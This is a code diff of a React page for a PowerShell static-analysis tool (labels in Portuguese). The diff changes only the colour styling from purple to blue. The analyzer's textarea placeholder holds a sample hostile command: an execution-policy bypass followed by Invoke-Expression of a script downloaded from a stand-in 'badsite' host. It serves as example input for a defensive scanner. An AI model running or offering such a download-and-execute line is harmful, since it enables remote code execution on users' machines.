@@ -219,7 +219,7 @@ export default function PowerShellBotPage() {
               onClick={() => setActiveTab('analyzer')}
               className={`flex items-center gap-3 w-full py-2.5 px-3 rounded font-mono text-[11px] uppercase tracking-wider transition-all duration-200 text-left
                 ${activeTab === 'analyzer'
-                  ? 'bg-neon-purple/10 border border-neon-purple/40 text-neon-purple'
+                  ? 'bg-neon-blue/10 border border-neon-blue/40 text-neon-blue'
                   : 'text-terminal-muted hover:text-white hover:bg-white/5 border border-transparent'
                 }`}
             >
@@ -424,7 +424,7 @@ export default function PowerShellBotPage() {
                 <div className="flex-1 flex flex-col gap-6 animate-fade-in">
                   <div>
                     <h1 className="font-mono text-base font-bold text-white flex items-center gap-2">
-                      <Shield size={18} className="text-neon-purple" />
+                      <Shield size={18} className="text-neon-blue" />
                       Análise Estática de Scripts PowerShell (.ps1)
                     </h1>
                     <p className="text-xs text-terminal-muted mt-1">
@@ -438,13 +438,13 @@ export default function PowerShellBotPage() {
                       onChange={(e) => setAnalyzerInput(e.target.value)}
                       rows={6}
                       placeholder="Cole o script PowerShell aqui... Ex:\nSet-ExecutionPolicy Bypass -Scope Process\nInvoke-Expression (New-Object Net.WebClient).DownloadString('http://badsite/payload.ps1')"
-                      className="w-full bg-black/40 border border-terminal-border/60 hover:border-neon-purple/50 focus:border-neon-purple focus:outline-none p-4 font-mono text-xs rounded transition-colors text-white leading-relaxed"
+                      className="w-full bg-black/40 border border-terminal-border/60 hover:border-neon-blue/50 focus:border-neon-blue focus:outline-none p-4 font-mono text-xs rounded transition-colors text-white leading-relaxed"
                     />
                     <div className="flex justify-end">
                       <button
                         onClick={handleAnalyzeScript}
                         disabled={loading || !analyzerInput.trim()}
-                        className="flex items-center gap-2 font-mono text-xs font-bold tracking-wider uppercase bg-neon-purple/15 text-neon-purple border border-neon-purple/40 hover:bg-neon-purple/25 hover:border-neon-purple px-6 py-2.5 rounded transition-all duration-300 disabled:opacity-40 disabled:pointer-events-none"
+                        className="flex items-center gap-2 font-mono text-xs font-bold tracking-wider uppercase bg-neon-blue/15 text-neon-blue border border-neon-blue/40 hover:bg-neon-blue/25 hover:border-neon-blue px-6 py-2.5 rounded transition-all duration-300 disabled:opacity-40 disabled:pointer-events-none"
                       >
                         <Play size={12} />
                         Analisar Script
@@ -488,7 +488,7 @@ export default function PowerShellBotPage() {
                             {analysisResult.findings.map((f: any, i: number) => (
                               <div key={i} className="bg-black/40 border border-terminal-border/30 rounded p-3 space-y-1.5 font-mono text-xs">
                                 <div className="flex justify-between items-center">
-                                  <span className="text-[10px] text-neon-purple font-bold bg-neon-purple/10 border border-neon-purple/30 px-1.5 py-0.5 rounded">
+                                  <span className="text-[10px] text-neon-blue font-bold bg-neon-blue/10 border border-neon-blue/30 px-1.5 py-0.5 rounded">
                                     {f.rule}
                                   </span>
                                   <span className={`text-[9px] font-bold px-1.5 py-0.2 rounded border ${f.severity === 'CRITICAL' ? 'bg-red-500/10 text-red-400 border-red-500/30' :
